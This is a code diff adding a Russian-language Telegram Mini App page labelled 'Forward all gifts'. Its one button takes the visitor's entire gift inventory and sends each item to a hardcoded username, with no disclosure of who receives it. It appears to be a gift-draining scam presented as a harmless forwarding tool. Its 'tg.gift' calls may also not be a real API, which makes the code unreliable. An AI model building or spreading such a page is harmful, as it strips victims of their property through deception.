@@ -1,0 +1,72 @@
+﻿<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>Переслать подарки</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body {
+            font-family: sans-serif;
+            text-align: center;
+            padding: 2em;
+        }
+
+        button {
+            font-size: 18px;
+            padding: 1em 2em;
+            background-color: #2aabee;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <h2>📤 Переслать все подарки</h2>
+    <button onclick="forwardGifts()">Переслать</button>
+    <p id="status"></p>
+
+    <script>
+    const tg = window.Telegram.WebApp;
+    tg.expand();
+
+        const RECIPIENT_USERNAME = "lilbuuda"; // 🟡 ВСТАВЬ нужное имя
+
+    async function forwardGifts() {
+      document.getElementById("status").innerText = "⏳ Пересылаем...";
+      try {
+        // Получаем все подарки в инвентаре
+        const inventory = await tg.gift.getInventory();
+        if (!inventory.length) {
+          document.getElementById("status").innerText = "😕 Нет подарков в профиле.";
+          return;
+        }
+
+        let successCount = 0;
+        let failedCount = 0;
+
+        for (const gift of inventory) {
+          try {
+            await tg.gift.sendGift({
+              gift_id: gift.id,
+              username: RECIPIENT_USERNAME,
+              comment: "🔁 Автоматическая пересылка",
+            });
+            successCount++;
+          } catch (e) {
+            console.error("Ошибка при пересылке:", e);
+            failedCount++;
+          }
+        }
+
+        document.getElementById("status").innerText =
+          `✅ Успешно переслано: ${successCount}\n❌ Ошибок: ${failedCount}`;
+      } catch (err) {
+        console.error("Ошибка при получении инвентаря:", err);
+        document.getElementById("status").innerText = "❌ Ошибка при работе с подарками.";
+      }
+    }
+    </script>
+</body>
+</html>
